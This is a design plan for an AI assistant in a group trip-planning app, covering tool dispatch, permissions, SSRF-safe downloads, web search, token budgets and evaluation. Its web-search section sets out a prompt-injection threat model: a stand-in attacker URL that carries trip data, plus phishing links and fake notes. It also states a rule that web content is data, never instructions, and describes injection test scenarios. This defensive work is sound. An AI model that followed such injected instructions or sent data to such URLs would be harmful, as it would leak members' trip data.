# AI assistant: implementation plan

Goal: an assistant in each trip that can **do almost everything a member can do** (with that
member's own rights). It can **search the web** to find new places, and **enrich existing places**
with notes, photos and links. Excluded: security and account operations (auth, password,
sessions, GDPR export/deletion), **invitations**, **members** (roles, removal, ownership transfer)
and trip deletion.

Provider: **OpenRouter** (OpenAI-compatible `chat/completions` API, one key). The first model is
**GLM** (`z-ai/glm-5.2`, pinned to a dated snapshot such as `z-ai/glm-5.2-20260616` for
reproducibility). The model is a config value, so other models can be compared without code
changes.

---

## 1. Principles carried over from the app

| App principle | Consequence for the assistant |
|---|---|
| Neutrality (no sponsored ranking) | The system prompt forbids promoting businesses. Web results are shown with their source. The deterministic `planner` stays the source of truth for itineraries and scores, and the LLM calls it rather than replacing it. |
| Privacy (GDPR, nothing resold) | Only trip data goes to OpenRouter: no emails and no other members' identities (first names are replaced by "member A/B" in structured fields; names typed inside free text such as review comments and notes are not scrubbed, and the privacy notice says so). Requests set `provider.data_collection = "deny"`, ZDR endpoints where available, and `provider.only` restricted to hosts covered by a data processing agreement, since GLM is served by several hosts in different jurisdictions. Conversations go into the GDPR export, are deleted with the account and are disclosed in the UI. |
| Roles (`viewer < editor < organizer`) | The assistant acts **as the user**: it can never do more than the user can. A viewer gets a read-only assistant, plus their own review if they ask for it. |
| Optimistic locking, real-time | Writes go through the existing routes, which keep the `version` checks, `Topic` notifications and rate limits. |
| Explainability | Every assistant change is attributed ("Alex (assistant) a modifié les lieux") and every web-sourced note, link or photo keeps its source URL. |

---

## 2. Architecture

```
Frontend (Assistant panel, SSE)
   │  POST /api/v1/trips/{t}/assistant/conversations/{c}/messages   (stream)
   ▼
assistant::chat  ── agent loop (max N rounds) ─────────────┐
   │   builds: system prompt + tools + trip snapshot + history
   ▼                                                        │
LlmProvider trait ──► OpenRouter (GLM, …)                  │ tool calls
                                                            ▼
                                  assistant::tools  ──►  in-process dispatch to the
                                  (allowlist, compact     existing Axum router
                                   schemas, result         (same cookie, Origin, ConnectInfo,
                                   shrinking)              AssistantCall extension)
                                        │
                                        ├─► web_search / fetch_page (sub-calls, see §5)
                                        └─► photo download (SSRF-safe, see §4)
```

### 2.1 Tools reuse the HTTP routes (in-process dispatch)

Business logic currently lives in the route handlers (validation, `require_role`, transactions,
`realtime.changed`). There are two ways to give the assistant the same powers:

- **A. Refactor** every handler into a service function called by both HTTP and tools. This is a
  large diff across about 50 routes, with a risk of drift.
- **B. Recommended: in-process dispatch.** A tool builds an `http::Request` and sends it to the
  `Router` with `tower::ServiceExt::oneshot`. It carries the caller's session cookie, an allowed
  `Origin`, the original request's `ConnectInfo` (so `ClientIp` stays correct) and **no**
  `X-Client-Id`, so every tab of the author refreshes too. Permissions, validation, 409 conflicts,
  rate limits and real-time events then behave exactly as if the user had clicked. Nothing is
  duplicated, and a new route becomes a tool by adding one allowlist entry.

The router is built once by `api::app(state)` and handed to the assistant through an `Extension`
layer added after it is built, not stored in `AppState`: an `AppState → Router → AppState` cycle
would never be freed and would leak one router per `#[sqlx::test]`. Responses are JSON, and the
tool layer **shrinks** them before giving them to the model (§6).

**Attribution.** The dispatcher inserts an `AssistantCall { conversation_id }` request
*extension* (not a header: extensions cannot be set by external clients, so it cannot be
spoofed). `realtime::Actor` gains a `via_assistant: bool` field filled from it, which the UI
renders as "Alex (assistant)".

**Rate limits.** Tools share the user's per-minute limits (`places:{user}`, `itinerary:{user}`,
`suggestions:{user}`, `wiki:{user}`…). A 429 is returned to the model as a short
`rate_limited, retry in Ns` tool result and is never retried automatically inside the loop; flows
that geocode many candidates (§5) batch them across turns.

### 2.2 `LlmProvider` trait (same pattern as `RoutingProvider` and `PlaceProvider`)

```rust
#[async_trait]
pub trait LlmProvider: Send + Sync {
    async fn complete(&self, req: ChatRequest) -> Result<ChatStream, LlmError>;
}
```

- `OpenRouter` implementation: `reqwest` (already a dependency), SSE parsing, no SDK. It sends
  `HTTP-Referer` and `X-Title` headers, `usage: {include: true}` (exact cost per call) and a
  `provider` block (`data_collection: "deny"`, `only: [<hosts with a DPA>]`, `sort`/`order`, and
  `require_parameters: true` so every provider honours `tools`).
- `ScriptedLlm` for tests: it replays predefined turns (tool calls, then text). This lets the
  integration tests (`#[sqlx::test]`) cover the whole loop without network access.

### 2.3 Configuration (`.env`)

```
OPENROUTER_API_KEY=            # absent → assistant disabled (feature hidden in the UI)
AI_MODEL=z-ai/glm-5.2          # main agent model
AI_MODEL_SMALL=                # summaries, page extraction, search condensing (defaults to AI_MODEL)
AI_MODELS_ALLOWED=             # comma list selectable per conversation (dev / comparison)
AI_DAILY_BUDGET_USD=0.50       # per user
AI_MAX_ROUNDS=8                # tool rounds per user message
```

### 2.4 Data (migration `0016_assistant.sql`; A1's enrichment tables come first as `0015_poi_enrichment.sql`)

- `assistant_conversations (id, trip_id, user_id, title, model, summary, summary_upto, created_at, updated_at)`:
  private to the user, deleted with the trip, with the account and when the member leaves.
- `assistant_messages (id, conversation_id, role, content jsonb, tool_name, tokens_in, tokens_out,
  cached_tokens, cost_usd, model, created_at)`: the full log for the UI and auditing. The model
  only ever sees a compacted view (§6).
- `assistant_usage (user_id, day, cost_usd, reserved_usd, tokens)`: enforces the daily budget
  (**429 `ai_budget_exceeded`**). Before each model call, an estimated maximum cost is
  *reserved* with a conditional `UPDATE … WHERE cost_usd + reserved_usd + $est <= budget`, then
  settled with the real `usage` cost. Two messages sent at once cannot both overspend.
- `assistant_pending_actions (id, conversation_id, tool, args jsonb, expires_at, consumed_at)`:
  actions that need confirmation (§3.3).

### 2.5 Request lifetime

The agent loop runs only inside the user's streaming request. If the browser disconnects, the loop
stops before the next model call or tool round (a tool call already sent to the router completes;
it is a normal, atomic route). Messages and tool results produced so far are saved, and the
conversation shows "interrompu" with what was done.

---

## 3. Tools

These are coarse, compactly described tools, about 25 in total instead of one per route. Places
are referenced with **short aliases** (`P1`, `P2`…) mapped server-side to UUIDs for the
conversation. Dates use `YYYY-MM-DD`.

### 3.1 Read (all roles)

| Tool | Route(s) | Notes |
|---|---|---|
| `trip_overview` | `GET /trips/{t}`, `/pois`, `/days`, `/itinerary` | Rarely needed, because the compact snapshot is already in the prompt (§6.2). |
| `poi_details(poi)` | `GET /pois/{p}`, `/reviews`, `/wiki`, notes, links, photos | Full details only on demand. |
| `search_places(query, near?)` | `GET /places/search` | Nominatim. 1 req/s is shared by the whole instance, so the per-user limit stays in force. |
| `suggestions(filter?, near_day?)` | `GET /suggestions`, `/regions`, `/airports` | Deterministic, explainable scores. |
| `route(pois[], modes?)` | `POST /routes` | Returns a summary (durations and modes), never the polyline. |

### 3.2 Write (editor or above, unless noted)

| Tool | Route(s) |
|---|---|
| `add_poi`, `update_poi` | `POST/PATCH /pois` |
| `add_note(poi, text, source_url?)` | new table, §4 |
| `add_link(poi, url, title, kind)` | new table, §4 |
| `add_photo(poi, image_url, source_page, author?, license?)` | new table, §4 |
| `set_my_review(poi, rating, comment)` | `PUT /reviews/me`. Any role, but **only when the user explicitly asks** (a review is a personal opinion). |
| `set_day(date, modes?, base_poi?)`, `set_stays`, `replace_stay` | days/stays routes |
| `propose_stays`, `apply_stays_proposal`, `propose_circuits` | stays/circuits routes |
| `dismiss_suggestion`, `reset_dismissals` | suggestions routes |
| `generate_itinerary`, `move_stop`, `lock_stop`, `recompute_day` | itinerary routes |
| `update_trip_settings` | `PATCH /trips/{t}` (organizer only: dates, modes, interests, pace, budget) |

**Never exposed:** `/auth/*`, `/me*`, `/invitations*`, `/trips/{t}/members*`, `DELETE /trips/{t}`,
`/ws`. The allowlist is checked by method and path pattern, so even a tool-call injection cannot
reach another route.

### 3.3 Confirmation for destructive or broad actions

`delete_poi`, `generate_itinerary` when an itinerary already exists (it overwrites manual
changes), `apply_stays_proposal`, `replace_stay` with `delete_placeholder`, `reset_dismissals`
and any bulk change of more than 5 places do not run directly. The tool returns `needs_confirmation` and
creates a `pending_action`. The UI shows a card ("Supprimer 3 lieux ? Confirmer / Annuler"), and
confirming calls `POST …/assistant/actions/{id}/confirm`, which runs the stored call. This also
makes prompt injection from web pages harmless for destructive actions.

A pending action expires after 15 minutes, can be confirmed only once (`consumed_at` is set in
the same transaction) and only by the conversation's owner. It runs through the same dispatcher,
so the role is re-checked at confirmation time. The stored call keeps the `version` it was built
against: if the place or itinerary changed meanwhile, the 409 is shown on the card ("modifié
entre-temps") and the action is never silently retried against the new version.

---

## 4. Enrichment: notes, links and photos (useful without AI too)

Today a place has a single `notes` field (2,000 chars), one `website` and the OSM contact fields
(`phone`, `email`, `wikidata`, `wikipedia`). Add (migration `0015_poi_enrichment.sql`):

- `poi_notes (id, poi_id, author_id, via_assistant bool, body ≤ 4000, source_url?, created_at)`
- `poi_links (id, poi_id, author_id, via_assistant, url https-only, title, kind ∈ {official,
  booking, article, video, map, other}, created_at)`, unique `(poi_id, url)`
- `poi_photos (id, poi_id, author_id, via_assistant, storage_key, width, height, mime, bytes,
  source_url?, source_page?, author_credit?, license?, created_at)`, at most 20 per place

**One home for notes.** The same migration copies every non-empty `pois.notes` into `poi_notes`
(author = the place's creator when known, otherwise none) and the column is dropped once the UI
reads only `poi_notes`. This avoids two competing note fields that the UI and the assistant
would each pick differently. `website` stays as the place's main link, shown first.

These get matching REST routes (`GET/POST/DELETE /trips/{t}/pois/{p}/notes|links|photos`) and UI
sections in `PoiPanel`, so users get the feature too and the assistant tools simply dispatch to
them. They are included in the GDPR export, and on account deletion they are kept without an
author (same rule as places).

**Photo pipeline** (`add_photo` and user uploads):
1. Users upload multipart. The assistant gives a URL, which is downloaded server-side **with SSRF
   protection**: https only; the host is resolved once, private, loopback, link-local and other
   non-public ranges (IPv4 and IPv6, including IPv4-mapped) are refused, and the connection is
   made **to the checked IP** (`reqwest::ClientBuilder::resolve`) so a second DNS answer cannot
   rebind it. Redirects are followed manually (at most 3), each hop re-checked the same way.
   10 MB limit and 10 s timeout.
2. The `image` crate decodes it (type sniffed, not trusted from headers), strips EXIF (GPS),
   re-encodes to WebP/JPEG at 1600 px plus a 400 px thumbnail.
3. Storage sits behind a `PhotoStore` trait, with a local volume (`/data/photos`) in dev and an
   S3-compatible store later. Photos are served through an authenticated route (members only).
4. **Copyright**: the assistant should prefer Wikimedia Commons (licence and author already
   handled by `wiki.rs`) and the place's official site. Otherwise it stores a link rather than a
   copy. The source and credit are always shown.

---

## 5. Web search

There are two options on OpenRouter:

- **`web` plugin or `:online` suffix** on the main request: every call pays for search results
  (Exa about $4 per 1,000 results, or the provider's native search), and the long result text enters
  the main context, so it is expensive on every round.
- **Recommended: a `web_search(query)` tool** run as a separate sub-call with `AI_MODEL_SMALL` and
  the `web` plugin (`max_results: 5`, a `search_prompt` asking for factual, sourced answers). The
  sub-call returns **condensed results** (≤ 5 × {title, url, 1–2 sentence summary}, about 300
  tokens total). Search is paid only when the agent decides it is needed, and raw pages never
  reach the main context.
- `fetch_page(url, question)`: a server fetch (same SSRF guard) followed by HTML-to-text
  conversion and a small-model extraction that answers only the question (opening hours, prices,
  phone, best season). It returns ≤ 200 tokens plus the URL. This is used to fill notes and
  links accurately. **URL provenance:** `fetch_page` only accepts a URL that appeared in a
  `web_search` result of this conversation, in the user's own message, or among the place's
  saved links/website. Otherwise an injected page could make the model fetch
  `https://attacker.example/?d=<trip snapshot>` and leak trip data through a read, which the
  confirmation gate (§3.3) does not cover. Query strings are kept only when the URL matches its
  source exactly.

Typical flow for "find hidden waterfalls near La Fortuna":
`suggestions(filter=nature, near)` (free, local OSM data) → `web_search` for blog and forum
mentions → `search_places` to geocode each candidate → proposal list in chat → the user picks →
`add_poi` + `add_note(source_url)` + `add_link`.

**Untrusted content**: every web result is wrapped in `<untrusted source="…">` in the tool result.
The system prompt says it is data, never instructions, and §3.3 gates the destructive tools.

Injection can still try to *write* (a phishing link or a fake note visible to the whole group
under a member's name), so:
- `add_link` / `add_photo` URLs and `add_note.source_url` follow the same provenance rule as
  `fetch_page`: the model cannot invent or be fed a new URL.
- Web-sourced links and photos are listed in the reply as a proposal ("Ajouter ces 3 liens ?"),
  added on one click, like a pending action. Notes written by the assistant are added directly
  but always show the source domain and the "assistant" badge, with one-click removal.

---

## 6. Token reduction strategies

Ordered by expected gain:

1. **Stable prefix for prompt caching.** The order is `system prompt → tool definitions → trip
   snapshot → summary of older turns → recent turns`. The first two are byte-identical across
   all users (no date or user name in them), so they stay cached. GLM caching on OpenRouter is
   automatic. Requests use the same provider ordering so they hit the same cache (OpenRouter
   sticky routing). `cached_tokens` is logged to measure the hit rate.
2. **Compact trip snapshot** (about 1 token per character saved counts): a line per place instead
   of JSON, aliases instead of UUIDs, no coordinates (region or nearest town instead), and empty
   fields dropped.
   ```
   Trip: Costa Rica 12–20 Dec · modes car,walk · pace normal · interests nature,wildlife
   Days: 12 base=P7 | 13 base=P7 | 14 base=P9 (zone) …
   Places (id|name|cat|rating|day):
   P1|Volcán Arenal|nature|4.5(3)|13
   P2|Soda Viquez|food|-|-
   ```
   That is about 25 tokens per place versus about 400 for a full `Poi` JSON. The snapshot is
   rebuilt each message and placed after the cached prefix.
3. **Few, tight tool schemas.** About 25 tools with one-line descriptions, enums instead of
   prose, and no nested optional objects. Group loading as a second step: only *read*, *places*
   and *enrich* are always present, while *itinerary*, *stays* and *settings* are added when the
   snapshot or the request makes them relevant (a keyword or intent check, or a `load_tools(group)`
   meta-tool). The cache trade-off: the default set stays fixed, and the extras go after it.
4. **Shrunk tool results.** Writes return `ok P12 "Catarata Río Fortuna" added (nature, 90 min)`
   instead of the full object. Lists are truncated with `…+12 more`. Polylines, wiki HTML, IDs
   and timestamps are never returned.
5. **History compaction.** The model sees the last 6 turns verbatim. Older tool results are
   replaced with one-line stubs (`[poi_details P3 → shown]`), and turns before that are rolled
   into a `summary` by `AI_MODEL_SMALL` once history passes about 6k tokens. New conversation =
   empty history (the snapshot carries the state).
6. **Sub-calls for heavy reading.** `web_search` and `fetch_page` run on the small model (§5),
   so the main model only sees short extracts.
7. **Output caps.** `max_tokens` is about 800 for replies. Reasoning effort is `low` by default
   (`reasoning: {effort}` or disabled for GLM if it adds latency without gain), and raised only
   for planning requests. The system prompt asks for short French answers.
8. **Loop guards.** At most `AI_MAX_ROUNDS` tool rounds per message, the same failing call
   repeated twice stops the loop, and parallel tool calls are allowed (fewer rounds).
9. **Deterministic first.** Itineraries, stays, circuits, scores and routes come from `planner`
   and Valhalla: free, fast and explainable. The LLM orchestrates and explains them, and never
   computes routes or schedules itself.
10. **Budget and observability.** Per-message usage and cost come from OpenRouter `usage`, with a
    per-user daily cap. An admin log line per turn records tokens in/out/cached, cost, rounds
    and model.

Target: **< 6k input tokens** for a typical turn on a 50-place trip, more than half of it cached.

---

## 7. Comparing models

- `AI_MODELS_ALLOWED` plus a dev-only model selector per conversation, with the model stored on
  each message.
- **Eval harness** (`backend/crates/api/tests/assistant_eval.rs`, `#[ignore]`, run manually with a
  real key) runs about 15 scripted scenarios on a seeded trip, for example: "add 3 restaurants near
  P7", "move Arenal to the 14th", "find a photo and opening hours for P1", "plan the itinerary",
  "delete everything" (must ask for confirmation) and prompt injections hidden in a fetched
  page (one asking for a destructive action, one asking to fetch an attacker URL carrying trip
  data, one asking to add a phishing link). It checks the resulting DB state and records success, rounds, tokens, cost and latency per
  model, so it doubles as a regression suite for prompt and tool changes.
- Candidates after GLM: a fast and cheap model for `AI_MODEL_SMALL`, plus a stronger tool-calling
  model as a baseline. OpenRouter's "Exacto" routing variants are worth testing for tool-call
  accuracy.

---

## 8. Frontend

- An **Assistant** drawer opened from the trip page, available on every tab (it shows changes on
  the map live through the existing real-time invalidation). The `Tab` union is unchanged.
- Streaming with SSE (`fetch` plus `ReadableStream`, since `EventSource` cannot POST). Tool
  activity is shown as compact chips ("Recherche web : cascades La Fortuna", "Lieu ajouté : P12"),
  with clickable place aliases that select the place on the map.
- Confirmation cards (§3.3), a conversation list, "Nouvelle conversation", the remaining daily
  budget, and a privacy notice ("les données du voyage sont envoyées à OpenRouter / Z.ai").
- `PoiPanel`: new **Notes**, **Liens** and **Photos** sections (gallery with credit), with an
  "assistant" badge on AI-added items.
- Real time: changes are attributed "X (assistant)" from `Actor.via_assistant` (§2.1). Tool calls
  carry no `X-Client-Id`, so the author's own tabs refresh too.
- French strings in `i18n/fr.ts`.

---

## 9. Security checklist

- The tool allowlist is enforced on method and path (deny by default). Excluded groups are tested
  explicitly (the model asks to invite someone, and the call is refused).
- The assistant uses the user's own session. A cookie is never stored for later use, and the
  loop only runs during the user's request.
- SSRF guard for `fetch_page` and photo downloads, connecting to the checked IP and re-checking
  every redirect. Size and time limits apply, plus an image decoding check.
- URL provenance for `fetch_page`, `add_link`, `add_photo` and note sources (no exfiltration
  through a read, no injected URLs written to the trip).
- Web content is marked untrusted, destructive actions need user confirmation, and web-sourced
  links and photos are proposed before being added.
- Assistant attribution comes from a request extension set by the dispatcher, never from a
  client header.
- Pending actions expire, are single-use and are owner-only.
- OpenRouter providers restricted to hosts covered by a DPA (`provider.only`).
- Rate limits are 20 messages/min per user and 200/day, alongside the cost budget.
- The OpenRouter key stays in env only, is never logged and is never sent to the frontend.
- GDPR: conversations are exported and deleted with the account, and removed when the member
  leaves the trip.

---

## 10. Increments

| # | Content | Done when |
|---|---|---|
| A0 | `LlmProvider` + OpenRouter client, config, `ScriptedLlm`, eval harness skeleton; confirm the GLM model ID, its hosts (for `provider.only`) and current web-search pricing on OpenRouter | Hello-world tool call with GLM through the key; tests use the scripted provider |
| A1 | Notes / links / photos: migration, REST, `PhotoStore`, SSRF-safe downloader, `PoiPanel` UI | Usable by people without AI; integration and UI tests |
| A2 | Assistant core: conversations, SSE endpoint, agent loop, snapshot, aliases, **read tools** | Answers questions about the trip; budget and usage recorded |
| A3 | **Write tools** through in-process dispatch, allowlist, confirmation flow, real-time attribution | Every user action except the excluded groups works from chat; viewer is read-only |
| A4 | `web_search`, `fetch_page`, enrichment flows (`add_note/link/photo` with sources) | Finds new places and enriches existing ones with cited sources |
| A5 | Token work: history compaction, tool groups, result shrinking, caching metrics; model comparison runs | Typical turn < 6k tokens, cache hit > 50 %; GLM vs 2–3 others compared on the eval suite |

Open questions:
- Should conversations stay private, or be shareable with the group?
- Who pays for the assistant: the organizer's plan, or a budget per trip rather than per user?
- Photo storage in production (S3-compatible provider, region for GDPR)?
- Should the assistant reply only in French, or in the user's language? Recommendation: the
  user's language (no extra constraint in the prompt; the UI chrome stays in French).
